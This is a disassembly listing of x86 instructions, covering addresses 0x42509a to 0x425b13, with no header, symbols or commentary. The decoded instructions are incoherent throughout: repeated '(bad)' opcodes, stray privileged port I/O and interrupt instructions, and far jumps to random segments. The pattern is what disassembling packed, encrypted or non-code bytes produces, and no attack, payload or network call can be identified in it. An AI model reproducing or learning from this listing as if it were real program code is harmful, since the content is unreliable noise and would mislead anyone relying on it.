  42509a:	stos   DWORD PTR es:[edi],eax
  42509b:	es pop ss
  42509d:	jg     0x425087
  42509f:	in     eax,0x35
  4250a1:	test   al,0x42
  4250a3:	xor    DWORD PTR [eax+eax*4+0x7782f04a],0x59
  4250ab:	scas   eax,DWORD PTR es:[edi]
  4250ac:	inc    ecx
  4250ad:	stc    
  4250ae:	jge    0xd8b7478e
  4250b4:	cmp    dh,BYTE PTR [ebx-0x691c9dcf]
  4250ba:	(bad)  
  4250bb:	aad    0xc9
  4250bd:	mov    dh,0x6
  4250bf:	dec    ebx
  4250c0:	pop    edi
  4250c1:	push   esi
  4250c2:	je     0x4250ac
  4250c4:	cmp    DWORD PTR [eax+0x5e7667c],eax
  4250ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250cb:	cmp    DWORD PTR [eax],edi
  4250cd:	cmp    DWORD PTR [ebp+ecx*8-0x1111954a],edi
  4250d4:	test   eax,0x7fc16329
  4250d9:	xchg   esi,eax
  4250da:	into   
  4250db:	popf   
  4250dc:	cdq    
  4250dd:	jns    0x42514b
  4250df:	ja     0x4250a8
  4250e1:	call   0x1804418f
  4250e6:	idiv   BYTE PTR [ecx]
  4250e8:	xor    BYTE PTR [esi],bl
  4250ea:	mov    ds:0x5705ca68,eax
  4250ef:	mov    ecx,DWORD PTR ds:0x7e340ed
  4250f5:	jmp    0x3b5f7aa2
  4250fa:	push   ds
  4250fb:	(bad)  
  4250fc:	mov    eax,0xeb916ae6
  425101:	dec    edx
  425102:	test   bh,ah
  425104:	inc    edi
  425105:	rol    al,cl
  425107:	mov    esi,0x287be475
  42510c:	mov    BYTE PTR [ecx+ebp*2-0xc],bh
	...
  425174:	ficom  WORD PTR [ecx]
  425176:	lahf   
  425177:	and    ebx,edi
  425179:	scas   eax,DWORD PTR es:[edi]
  42517a:	(bad)  
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x75df:0xc25092e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [esi+ebx*1],ch
  42518e:	mov    ecx,fs
  425190:	iret   
  425191:	frstor ds:[edi-0x6d]
  425195:	mov    cl,0x1d
  425197:	push   eax
  425198:	dec    edi
  425199:	(bad)  
  42519a:	rol    DWORD PTR [ecx-0x7e4a5243],1
  4251a0:	das    
  4251a1:	sbb    ah,BYTE PTR [edi-0x2e66e8aa]
  4251a7:	mov    ecx,0xfffb5c94
  4251ad:	mov    edx,0x8b9264be
  4251b2:	inc    eax
  4251b3:	push   esi
  4251b4:	iret   
  4251b5:	push   esp
  4251b6:	(bad)  
  4251b7:	mov    ecx,0xee728d42
  4251bc:	pop    ds
  4251bd:	cwde   
  4251be:	jle    0x425222
  4251c0:	mov    BYTE PTR [ecx+0x76],bl
  4251c3:	inc    esi
  4251c4:	sub    esp,DWORD PTR [edx+0x65]
  4251c7:	dec    ecx
  4251c8:	mov    ecx,0x2908819f
  4251cd:	aad    0xd4
  4251cf:	std    
  4251d0:	dec    edi
  4251d1:	or     DWORD PTR ds:0xf1aa86ed,0x3c54f50
  4251db:	mov    ebp,0x871ae9f2
  4251e0:	cmp    ecx,DWORD PTR [edi+esi*4]
  4251e3:	es out dx,al
  4251e5:	push   ds
  4251e6:	jnp    0x4251e0
  4251e8:	ins    BYTE PTR es:[edi],dx
  4251e9:	loope  0x425229
  4251eb:	and    eax,DWORD PTR [edi]
  4251ed:	jmp    0x6a11:0xf2f93a70
  4251f4:	or     ecx,DWORD PTR [esi]
  4251f6:	sub    ah,BYTE PTR [esi+ebx*4+0x55]
  4251fa:	dec    edx
  4251fb:	add    BYTE PTR [ecx],0xab
  4251fe:	mov    ?,WORD PTR [edx-0x41]
  425201:	sub    al,0xd8
  425203:	and    bl,bl
  425205:	xor    al,0x5a
  425207:	test   BYTE PTR [edi-0x62e7b97d],ch
  42520d:	jmp    0xd172b45c
  425212:	gs aam 0x1e
  425215:	fs cli 
  425217:	adc    cl,BYTE PTR [esp+ebp*4-0x110c5e2b]
  42521e:	(bad)  
  42521f:	bnd repz ret 0x4e6d
  425224:	add    ebp,DWORD PTR [edi]
  425226:	mov    al,0x87
  425228:	out    dx,al
  425229:	push   ss
  42522a:	cli    
  42522b:	dec    ebp
  42522c:	add    DWORD PTR [edx+0x61],esi
  42522f:	shr    ebp,1
  425231:	adc    edx,DWORD PTR [esi]
  425233:	call   0x51b1:0xb91a4091
  42523a:	xor    al,0xb7
  42523c:	out    dx,al
  42523d:	aas    
  42523e:	or     BYTE PTR [ecx-0x5f],cl
  425241:	jmp    0xdb90:0x10e6eb0e
  425248:	mov    ds:0xc3ee1310,eax
  42524d:	bsf    ebx,DWORD PTR [edi+eax*8-0x1149799a]
  425255:	dec    edx
  425256:	cmp    ebp,DWORD PTR [esp+eax*8+0x7e80993e]
  42525d:	cmp    ebx,0x7494b3fb
  425263:	fwait
  425264:	cld    
  425265:	and    ah,BYTE PTR [eax-0x28]
  425268:	ret    
  425269:	mov    ebp,DWORD PTR [ecx-0x55aa9cb8]
  42526f:	dec    edx
  425270:	out    0x5,al
  425272:	push   eax
  425273:	jmp    0xda98:0xaa052ab6
  42527a:	rcr    DWORD PTR [edi+esi*4-0x6b],0x65
  42527f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425280:	xchg   esi,ecx
  425282:	or     dh,bh
  425284:	fld    TBYTE PTR [edx-0x48]
  425287:	inc    ecx
  425288:	cmp    al,0x65
  42528a:	add    edi,DWORD PTR [edi+ebx*8]
  42528d:	lea    eax,[ebx+0x7a]
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	sub    eax,0xbc07c49f
  425305:	mov    WORD PTR [ecx],es
  425307:	add    BYTE PTR [ecx+eax*1],al
  42530a:	add    BYTE PTR [eax],al
  42530c:	cli    
  42530d:	icebp  
  42530e:	xchg   esi,eax
  42530f:	pop    ss
  425310:	mov    ds:0x369c7bb7,eax
  425315:	push   0xffffffcf
  425317:	hlt    
  425318:	mov    al,0xfc
  42531a:	mov    BYTE PTR [ebp+ebx*4+0x3f6f4ba7],ah
  425321:	fwait
  425322:	test   DWORD PTR [ebp+0x26],0x56e3019b
  425329:	pop    esi
  42532a:	leave  
  42532b:	lock push ebx
  42532d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42532e:	dec    esp
  42532f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425330:	pop    ebp
  425331:	loope  0x425384
  425333:	and    al,0x79
  425335:	push   ss
  425336:	in     eax,0xfb
  425338:	xor    DWORD PTR [edx+0x5ae4e91d],ebx
  42533e:	or     al,0x8
  425340:	xchg   esp,eax
  425341:	push   ebx
  425342:	add    DWORD PTR [esi-0x4d13d907],esp
  425348:	mov    ebp,0xccc0cfb1
  42534d:	sar    BYTE PTR [ebx-0x78],0x35
  425351:	les    ecx,FWORD PTR [edx+0x60]
  425354:	jae    0x4253a7
  425356:	or     DWORD PTR [ecx+0x36324209],ecx
  42535c:	pusha  
  42535d:	in     eax,dx
  42535e:	(bad)  
  42535f:	call   0x27055d14
  425364:	mov    cs,WORD PTR ss:[edx-0x71831ad0]
  42536b:	cli    
  42536c:	pop    edx
  42536d:	xor    dl,BYTE PTR [eax+0x33]
  425370:	repz sub ch,BYTE PTR [edi]
  425373:	push   ecx
  425374:	sub    dh,dl
  425376:	adc    esp,eax
  425378:	je     0x42539f
  42537a:	ret    0x830
  42537d:	dec    ecx
  42537e:	sbb    BYTE PTR [edi+0x99518b6],bl
  425384:	mov    ah,0xf6
  425386:	sahf   
  425387:	xor    bh,BYTE PTR [edi+eiz*1-0x1f137ed4]
  42538e:	sub    al,0x56
  425390:	xor    BYTE PTR [ecx-0x32],dh
  425393:	xor    dl,BYTE PTR [ecx-0x46]
  425396:	mov    ecx,0xe921efdf
  42539b:	mov    WORD PTR [ebp-0x10],ss
  42539e:	pop    ds
  42539f:	out    0xf8,eax
  4253a1:	add    DWORD PTR [ebx+0x6],ebx
  4253a4:	inc    ebx
  4253a5:	int    0x74
  4253a7:	and    BYTE PTR [edx],0x9a
  4253aa:	mov    bh,0x50
  4253ac:	iret   
  4253ad:	jecxz  0x42538f
  4253af:	and    BYTE PTR [ebx+ecx*2+0x79],bh
  4253b3:	jp     0x42536d
  4253b5:	adc    al,0x1e
  4253b7:	shl    DWORD PTR [edx-0x20],cl
  4253ba:	lock pushf 
  4253bc:	sub    DWORD PTR [ecx-0x51],ecx
  4253bf:	dec    ebp
  4253c0:	pop    es
  4253c1:	cmp    BYTE PTR [eax+0x1ab38f31],dl
  4253c7:	fild   DWORD PTR [edi]
  4253c9:	iret   
  4253ca:	sub    eax,0x221ebae
  4253cf:	xor    al,0x2c
  4253d1:	ret    
  4253d2:	add    eax,0x853a2310
  4253d7:	stos   DWORD PTR es:[edi],eax
  4253d8:	mov    edx,0x3bf5edb1
  4253dd:	xor    DWORD PTR [ebx+0x7f581f96],ebp
  4253e3:	inc    ebx
  4253e4:	(bad)  
  4253e5:	sub    al,0x4a
  4253e7:	mov    dh,0x70
  4253e9:	inc    ebx
  4253ea:	shl    BYTE PTR [esi],0x27
  4253ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253ee:	sbb    al,0x9a
  4253f0:	xchg   BYTE PTR [ecx+0x48e53116],bh
  4253f6:	cmp    dh,BYTE PTR [ebx+edi*2]
  4253f9:	shl    DWORD PTR [edi],1
  4253fb:	dec    edx
  4253fc:	add    ah,BYTE PTR [ecx]
  4253fe:	popf   
  4253ff:	sub    ch,ch
  425401:	les    edi,FWORD PTR [ecx-0x5e]
  425404:	mov    ds:0xb2937d7a,eax
  425409:	test   esi,edx
  42540b:	adc    al,0x30
  42540d:	nop
  42540e:	add    dh,al
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ecx,DWORD PTR [edx-0x3faa3e71]
  425485:	lea    eax,[ecx]
  425487:	add    BYTE PTR [ecx+eax*1],al
  42548a:	add    BYTE PTR [eax],al
  42548c:	mov    ch,BYTE PTR [ecx]
  42548e:	lods   al,BYTE PTR ds:[esi]
  42548f:	idiv   BYTE PTR ds:0xa708febc
  425495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425496:	dec    ecx
  425497:	call   0xae8a02f4
  42549c:	jae    0x4254b1
  42549e:	push   ds
  42549f:	jmp    0x425506
  4254a1:	in     al,dx
  4254a2:	stos   DWORD PTR es:[edi],eax
  4254a3:	jns    0x4254cc
  4254a5:	cmp    cl,BYTE PTR [edi]
  4254a7:	iret   
  4254a8:	test   cl,dl
  4254aa:	sub    al,0x29
  4254ac:	push   ss
  4254ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254ae:	jo     0x4254a9
  4254b0:	fwait
  4254b1:	movaps XMMWORD PTR [ebx+0x24],xmm1
  4254b5:	jp     0x425516
  4254b7:	dec    ecx
  4254b8:	add    cl,BYTE PTR [esi]
  4254ba:	cmp    al,cl
  4254bc:	shl    esi,cl
  4254be:	sbb    DWORD PTR [ebp+0x7c7b646e],esi
  4254c4:	or     bl,BYTE PTR [esp+edi*4-0x21]
  4254c8:	ins    BYTE PTR es:[edi],dx
  4254c9:	fdivp  st(2),st
  4254cb:	fld    TBYTE PTR [eax-0x5440127f]
  4254d1:	push   cs
  4254d2:	cmovg  ebx,DWORD PTR [edx-0x47c6f9e7]
  4254d9:	call   0xe0ad:0xa2231521
  4254e0:	adc    edx,DWORD PTR [eax-0x24983bc]
  4254e6:	xchg   ecx,eax
  4254e7:	add    ebp,DWORD PTR [ecx-0x7a]
  4254ea:	mov    al,0xc6
  4254ec:	loopne 0x425553
  4254ee:	js     0x4254fe
  4254f0:	mov    ecx,0x7fd7d4ed
  4254f5:	adc    DWORD PTR [ecx],esi
  4254f7:	sbb    DWORD PTR ds:0x242ef453,edi
  4254fd:	jno    0x4254ba
  4254ff:	cmp    DWORD PTR [ecx+edx*1+0x449e20fe],ebx
  425506:	inc    eax
  425507:	ins    DWORD PTR es:[edi],dx
  425508:	inc    ebp
  425509:	test   dh,ch
  42550b:	push   ecx
  42550c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42550d:	fistp  DWORD PTR [eax]
  42550f:	sub    ch,dl
  425511:	cdq    
  425512:	or     al,0x2a
  425514:	mov    ecx,0x406f4960
  425519:	sub    al,0x16
  42551b:	dec    ebx
  42551c:	mov    al,0x6e
  42551e:	push   ss
  42551f:	js     0x4254dc
  425521:	jns    0x4254d5
  425523:	inc    edi
  425524:	cmp    esi,DWORD PTR [ebx+0x12f23ef0]
  42552a:	inc    esi
  42552b:	(bad)  
  42552c:	push   0xffffff97
  42552e:	mov    ss,esp
  425530:	cld    
  425531:	or     al,0x1f
  425533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425534:	stos   DWORD PTR es:[edi],eax
  425535:	mov    ebx,0x41de433c
  42553a:	cmp    edx,DWORD PTR [edx-0x20]
  42553d:	out    0x63,eax
  42553f:	(bad)  [edx]
  425541:	rcl    BYTE PTR [edi+0x9],0xbb
  425545:	out    0xae,eax
  425547:	cli    
  425548:	xor    al,0xf8
  42554a:	repnz or BYTE PTR [ebp+0x38],0x8e
  42554f:	xchg   edx,eax
  425550:	xor    bh,BYTE PTR [edx-0x73]
  425553:	(bad)
  425556:	(bad)  
  425558:	or     eax,0xab7502f
  42555d:	jbe    0x4254f7
  42555f:	push   cs
  425560:	mov    ebp,0x27e4decc
  425565:	or     BYTE PTR [eax],ch
  425567:	pop    ss
  425568:	lea    eax,[esi-0x13]
  42556b:	sub    edx,DWORD PTR [ecx+0x3a]
  42556e:	js     0x425518
  425570:	dec    eax
  425571:	inc    ebx
  425572:	lea    eax,[edx+ecx*4+0x38]
  425576:	mov    ebx,0xa50d3a90
  42557b:	add    edx,ebx
  42557d:	adc    al,0xc6
  42557f:	cmp    BYTE PTR [edi+ebp*8-0x5f],dl
  425583:	cld    
  425584:	mov    bh,0x6c
  425586:	or     BYTE PTR [edi],al
  425588:	jmp    0xe185c7a0
  42558d:	mov    ch,0x4f
  42558f:	jmp    0x425591
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xffacf13a
  425602:	ins    DWORD PTR es:[edi],dx
  425603:	add    esp,eax
  425605:	mov    es,WORD PTR [ecx]
  425607:	add    BYTE PTR [ecx+eax*1],al
  42560a:	add    BYTE PTR [eax],al
  42560c:	and    DWORD PTR [eax],esi
  42560e:	stc    
  42560f:	dec    edx
  425610:	dec    ecx
  425611:	mov    bl,0x51
  425613:	push   edi
  425614:	xlat   BYTE PTR ds:[ebx]
  425615:	ret    
  425616:	pop    ss
  425617:	jae    0x4255bc
  425619:	cs push ss
  42561b:	(bad)  
  42561c:	es nop
  42561e:	and    BYTE PTR [edx],dh
  425620:	ins    DWORD PTR es:[edi],dx
  425621:	int3   
  425622:	jns    0x425690
  425624:	repz mov edx,0xbd5e6ce9
  42562a:	mov    bh,0x8d
  42562c:	jle    0x425627
  42562e:	mov    bl,0xc3
  425630:	fidiv  WORD PTR [ecx+0x537cba0d]
  425636:	test   DWORD PTR [edx+0x795671c0],0x935e2402
  425640:	sbb    cl,BYTE PTR [ebx-0x6f]
  425643:	cmc    
  425644:	shl    BYTE PTR [edx],cl
  425646:	repz dec ecx
  425648:	mul    al
  42564a:	add    edx,ebp
  42564c:	inc    ecx
  42564d:	repnz add dl,al
  425650:	xor    ah,BYTE PTR [ebx+ebp*2+0x359fb8f5]
  425657:	je     0x425678
  425659:	mov    ds:0xb0e9201f,eax
  42565e:	scas   al,BYTE PTR es:[edi]
  42565f:	and    al,0xce
  425661:	dec    ecx
  425662:	push   ecx
  425663:	mov    cl,0xc0
  425665:	enter  0x764,0x47
  425669:	imul   BYTE PTR [ebp-0x784f7054]
  42566f:	add    al,0x22
  425671:	(bad)  
  425672:	ret    
  425673:	dec    ebx
  425674:	in     al,0x9
  425676:	ficomp WORD PTR [edx+0x3d5687ba]
  42567c:	cwde   
  42567d:	sbb    BYTE PTR [ebx],ch
  42567f:	cmp    bl,ah
  425681:	es or  eax,0xefdc34c7
  425687:	out    dx,eax
  425688:	nop
  425689:	leave  
  42568a:	and    eax,0xea1e6a2a
  42568f:	fdivr  QWORD PTR [ebp+0x7ca44c1c]
  425695:	fsub   QWORD PTR [edx+0x56]
  425698:	jmp    0xa1d6:0xac7734d
  42569f:	lahf   
  4256a0:	cmp    al,0xe7
  4256a2:	or     eax,0xf20ff2d5
  4256a7:	ss stos DWORD PTR es:[edi],eax
  4256a9:	in     al,dx
  4256aa:	ins    DWORD PTR es:[edi],dx
  4256ab:	xor    DWORD PTR [esi+0x5f],ebx
  4256ae:	and    edx,DWORD PTR [ebx+ebp*4]
  4256b1:	pop    esi
  4256b2:	ret    0xd8d7
  4256b5:	shl    DWORD PTR ds:0xcbeda8c8,1
  4256bb:	test   BYTE PTR [ecx],bh
  4256bd:	lods   eax,DWORD PTR ds:[esi]
  4256be:	mov    bl,0x23
  4256c0:	out    dx,eax
  4256c1:	(bad)  ds:0x6fff8b10
  4256c7:	jmp    0x42564f
  4256c9:	xchg   DWORD PTR [edi],ecx
  4256cb:	into   
  4256cc:	icebp  
  4256cd:	jmp    0xd6cf6f8f
  4256d2:	cli    
  4256d3:	and    bh,BYTE PTR [ecx]
  4256d5:	loop   0x425660
  4256d7:	in     al,0xf7
  4256d9:	push   eax
  4256da:	ficom  WORD PTR [ebx-0x737e93b]
  4256e0:	pop    ss
  4256e1:	sub    DWORD PTR [eax],0x7e
  4256e4:	or     bl,BYTE PTR [ebp+0x2c]
  4256e7:	add    BYTE PTR [esi],ah
  4256e9:	push   ecx
  4256ea:	xlat   BYTE PTR ds:[ebx]
  4256eb:	sbb    al,0xa5
  4256ed:	sub    bh,BYTE PTR [eax-0x25]
  4256f0:	xchg   esi,eax
  4256f1:	loopne 0x425721
  4256f3:	jns    0x4256b8
  4256f5:	mov    dl,0xbc
  4256f7:	nop
  4256f8:	pop    es
  4256f9:	inc    esp
  4256fa:	fstp   QWORD PTR [eax+0x7a]
  4256fd:	xchg   ebp,eax
  4256fe:	pop    ebp
  4256ff:	and    ah,BYTE PTR [edx]
  425701:	es iret 
  425703:	in     al,0x9a
  425705:	mov    ebp,0x1bbfc7d
  42570a:	in     eax,0xc8
  42570c:	gs popf 
  42570e:	and    ebx,DWORD PTR [esi]
	...
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x929ce374
  425783:	call   0x43e750
  425788:	add    al,0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	dec    edi
  42578d:	cld    
  42578e:	mov    bl,ch
  425790:	push   esi
  425791:	bndstx [eax],(bad)
  425794:	mov    DWORD PTR [ecx],0xad79a63
  42579a:	mov    ecx,0xf602d829
  42579f:	(bad)  
  4257a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257a1:	call   0xaf9b7a71
  4257a6:	xchg   edi,eax
  4257a7:	or     ebp,DWORD PTR [edi]
  4257a9:	jg     0x4257a1
  4257ab:	mov    ecx,0x4dc7431d
  4257b0:	scas   al,BYTE PTR es:[edi]
  4257b1:	dec    ebx
  4257b2:	push   esp
  4257b3:	imul   eax,DWORD PTR [ecx-0x42ac550a],0xffffff84
  4257ba:	dec    edx
  4257bb:	test   DWORD PTR [ebp-0x2a],ebx
  4257be:	sbb    al,0xd9
  4257c0:	daa    
  4257c1:	in     al,dx
  4257c2:	retf   
  4257c3:	dec    eax
  4257c4:	mov    edx,0xcd59e46b
  4257c9:	test   ecx,esp
  4257cb:	pop    ss
  4257cc:	es in  al,0x69
  4257cf:	xlat   BYTE PTR ds:[ebx]
  4257d0:	inc    ebp
  4257d1:	mov    bl,0x2a
  4257d3:	add    eax,0x6eebb469
  4257d8:	sbb    DWORD PTR cs:[ebx-0x59baed0d],esi
  4257df:	or     DWORD PTR [edx],ebp
  4257e1:	(bad)  
  4257e2:	mov    esp,0x2e4c9ffe
  4257e7:	arpl   WORD PTR [edx+ebx*8-0x3d],bx
  4257eb:	pushf  
  4257ec:	push   edx
  4257ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257ee:	inc    ebp
  4257ef:	in     eax,0x6a
  4257f1:	stos   DWORD PTR es:[edi],eax
  4257f2:	push   edx
  4257f3:	stos   DWORD PTR es:[edi],eax
  4257f4:	adc    DWORD PTR [ebx+0x28],ecx
  4257f7:	js     0x425781
  4257f9:	adc    BYTE PTR [ecx+0x34],bh
  4257fc:	sub    ch,al
  4257fe:	pusha  
  4257ff:	adc    DWORD PTR [edx+ebx*4+0x5909f638],eax
  425806:	lods   al,BYTE PTR ds:[esi]
  425807:	repnz pop esp
  425809:	mov    dl,0x4d
  42580b:	iret   
  42580c:	leave  
  42580d:	lds    esi,FWORD PTR [esi]
  42580f:	shl    DWORD PTR [ecx],1
  425811:	pop    ss
  425812:	popa   
  425813:	mov    dh,0x12
  425815:	js     0x42588a
  425817:	push   esp
  425818:	lods   al,BYTE PTR ds:[esi]
  425819:	sub    eax,ebp
  42581b:	ins    DWORD PTR es:[edi],dx
  42581c:	mov    ebx,0x78448ccc
  425821:	pop    edi
  425822:	and    DWORD PTR ds:0x4644b3a0,eax
  425828:	mov    ch,0x85
  42582a:	ror    DWORD PTR [ebp-0x1b],cl
  42582d:	add    al,0x9d
  42582f:	xor    bh,bh
  425831:	adc    ch,ah
  425833:	ins    DWORD PTR es:[edi],dx
  425834:	lahf   
  425835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425836:	cmovb  ebx,edx
  425839:	or     dl,BYTE PTR [ebp+0x5e]
  42583c:	or     ebx,DWORD PTR [esi-0x71b987a9]
  425842:	xchg   BYTE PTR [eax+0x2b23cfc6],ah
  425848:	xchg   esi,eax
  425849:	jp     0x4257e8
  42584b:	adc    BYTE PTR [ecx],0xcd
  42584e:	fadd   st,st(3)
  425850:	jns    0x425896
  425852:	imul   BYTE PTR [edi]
  425854:	xor    eax,0x76430cfe
  425859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42585a:	cmp    DWORD PTR [ebx-0x42e730c7],esp
  425860:	inc    edx
  425861:	sub    al,0x44
  425863:	push   esp
  425864:	xor    eax,0xc1c5af06
  425869:	and    DWORD PTR [ebx+0x6b],ebx
  42586c:	jmp    0xecdb:0xeba966e
  425873:	cmp    al,0xdb
  425875:	sub    bl,BYTE PTR [esi-0x995a9c9]
  42587b:	fs jae 0x42582a
  42587e:	adc    bl,bl
  425880:	jne    0x4258e9
  425882:	jb     0x425815
  425884:	mov    al,dh
  425886:	jge    0x4258e0
  425888:	mov    cl,0x80
  42588a:	not    DWORD PTR ds:0xcc66990a
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	out    dx,al
  425901:	sar    DWORD PTR [edi-0x74],0xcc
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	fsub   DWORD PTR [esi+0x5b6048f4]
  425912:	retf   
  425913:	or     al,0xb6
  425915:	mov    esi,0xee892f44
  42591a:	leave  
  42591b:	fdiv   DWORD PTR [ebp+0x6c]
  42591e:	adc    dh,dl
  425920:	and    BYTE PTR [edx+0x4c],al
  425923:	lods   al,BYTE PTR ds:[esi]
  425924:	mov    al,ds:0x9ff58a6b
  425929:	outs   dx,DWORD PTR ds:[esi]
  42592a:	fimul  WORD PTR [ebp-0x4e]
  42592d:	mov    ebp,0xe148603c
  425932:	pop    ecx
  425933:	inc    edi
  425934:	inc    ecx
  425935:	repz (bad) 
  425937:	rol    eax,1
  425939:	jmp    0x2ead6c95
  42593e:	dec    esp
  42593f:	popa   
  425940:	sbb    al,0x2b
  425942:	not    BYTE PTR [eax-0x10]
  425945:	push   cs
  425946:	fsub   DWORD PTR [ebp+ebp*2+0x3e69cdd2]
  42594d:	sbb    al,0xa4
  42594f:	lock mov WORD PTR [ecx],ss
  425952:	jle    0x4259bf
  425954:	xor    cl,dl
  425956:	sub    ecx,edx
  425958:	mov    ah,0xe9
  42595a:	retf   
  42595b:	add    ah,BYTE PTR [edi+0x1a2d2f5d]
  425961:	sti    
  425962:	aaa    
  425963:	call   0xbada7693
  425968:	pop    ebx
  425969:	or     bl,BYTE PTR [ebp-0x1dc8d93e]
  42596f:	add    DWORD PTR [edi],edx
  425971:	jecxz  0x42591c
  425973:	out    0x47,al
  425975:	xor    eax,0xf77efc02
  42597a:	push   0xe7e5092d
  42597f:	mov    ?,WORD PTR [ebx]
  425981:	cmp    cl,BYTE PTR [eax]
  425983:	xchg   edx,eax
  425984:	mov    ch,0xbe
  425986:	inc    ebx
  425987:	sub    bl,dh
  425989:	jg     0x42592c
  42598b:	lods   al,BYTE PTR ds:[esi]
  42598c:	fwait
  42598d:	enter  0xebc6,0x3b
  425991:	sti    
  425992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425993:	cli    
  425994:	xor    al,0x6d
  425996:	mov    al,0xc4
  425998:	sbb    dh,BYTE PTR [edx]
  42599a:	(bad)  
  42599c:	sahf   
  42599d:	mov    ds:0x5c18c4a3,eax
  4259a2:	fs data16 int3 
  4259a5:	lods   al,BYTE PTR ds:[esi]
  4259a6:	fidiv  WORD PTR [ebx-0x7f]
  4259a9:	ror    BYTE PTR [ecx-0x65],1
  4259ac:	fstp   st(2)
  4259ae:	(bad)  
  4259af:	test   BYTE PTR ds:0x4c64fe86,cl
  4259b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259b6:	cmc    
  4259b7:	retf   0x365
  4259ba:	test   BYTE PTR [edx+0x43aacab3],dl
  4259c0:	dec    ebp
  4259c1:	stos   BYTE PTR es:[edi],al
  4259c2:	(bad)  
  4259c3:	xchg   ebp,eax
  4259c4:	outs   dx,DWORD PTR ds:[esi]
  4259c5:	daa    
  4259c6:	inc    ebp
  4259c7:	and    eax,0x34344d2d
  4259cc:	call   0x43b5:0x4c80bc6c
  4259d3:	outs   dx,DWORD PTR ds:[esi]
  4259d4:	xor    DWORD PTR [edi+ebp*8+0x10],esi
  4259d8:	aad    0x84
  4259da:	push   0x717ad9bc
  4259df:	imul   bx,WORD PTR [ebx+0xcb917e0],0x4c81
  4259e8:	or     BYTE PTR [eax+0x33e1039f],0x6f
  4259ef:	and    eax,0x4104cf93
  4259f4:	jmp    0x2c69:0x47972226
  4259fb:	call   0xa30fe971
  425a00:	shl    DWORD PTR [esi+0x6edf0c93],1
  425a06:	dec    esi
  425a07:	xlat   BYTE PTR ds:[ebx]
  425a08:	xchg   ebp,eax
  425a09:	stos   BYTE PTR es:[edi],al
  425a0a:	fs cli 
  425a0c:	mov    bl,0x76
  425a0e:	xor    BYTE PTR [eax+eax*1+0x0],dl
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x3f69b27e]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	fnstcw WORD PTR ds:0x8474d714
  425a92:	and    BYTE PTR [esi],bl
  425a94:	jl     0x425aa6
  425a96:	loop   0x425b0c
  425a98:	imul   edi,DWORD PTR [eax-0x46],0x36647e01
  425a9f:	jns    0x425adc
  425aa1:	and    esp,0x41f71bfb
  425aa7:	sbb    esp,DWORD PTR [edi]
  425aa9:	pop    ecx
  425aaa:	rcr    ah,0x77
  425aad:	mov    esi,0x5028fddc
  425ab2:	imul   esp,DWORD PTR [edi+0x33d14ffe],0x8602be6b
  425abc:	bound  ebx,QWORD PTR [ecx]
  425abe:	push   ebx
  425abf:	and    DWORD PTR [edx-0x63],0x7a
  425ac3:	inc    esi
  425ac4:	mov    eax,0xaba185a1
  425ac9:	cmove  esp,DWORD PTR [eax]
  425acc:	es mov eax,0xeaf3d986
  425ad2:	daa    
  425ad3:	mov    dh,0xf
  425ad5:	adc    DWORD PTR [edx],esp
  425ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ad8:	jo     0x425b0b
  425ada:	inc    edx
  425adb:	inc    esp
  425adc:	dec    esp
  425add:	mov    dl,0x2b
  425adf:	sbb    DWORD PTR [edx-0x7f356dae],ebx
  425ae5:	mov    eax,0x53a885a8
  425aea:	or     ebx,eax
  425aec:	sbb    BYTE PTR [eax+0x23],ah
  425aef:	jae    0x425a87
  425af1:	dec    esp
  425af2:	in     eax,dx
  425af3:	cmp    eax,0xbecef356
  425af8:	or     DWORD PTR [edx],ebx
  425afa:	sahf   
  425afb:	add    al,0x12
  425afd:	iret   
  425afe:	pop    ds
  425aff:	ficom  WORD PTR [eax-0x6aab7b2e]
  425b05:	jae    0x425b79
  425b07:	sbb    BYTE PTR [eax-0x77],0xf8
  425b0b:	ss xor al,0xd1
  425b0e:	push   0x18fbe846
  425b13:	adc    al,0x93
